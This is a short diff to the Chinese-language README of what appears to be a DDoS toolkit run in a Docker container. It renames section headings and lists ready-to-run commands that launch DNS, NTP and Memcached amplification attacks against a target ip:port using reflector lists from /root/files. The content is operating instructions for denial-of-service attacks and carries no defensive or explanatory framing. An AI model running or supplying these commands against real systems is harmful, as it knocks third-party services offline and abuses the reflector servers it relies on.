@@ -12,17 +12,14 @@
 	docker exec -it ddos-layer7 /bin/bash
 
 #### ddos-layer4使用（放大）反射文件位置/root/files
-DNS放大
+第四层（放大）
 
 	docker exec -it ddos-layer7 python3 start.py DNS ip:port 1 60 dns.txt &
 
-NTP放大
-
 	docker exec -it ddos-layer7 python3 start.py NTP ip:port 1 60 ntp.txt &
 
-MEM放大
-
 	docker exec -it ddos-layer7 python3 start.py MEM ip:port 1 60 meme.txt &
+
 
 第四层（可代理）
 
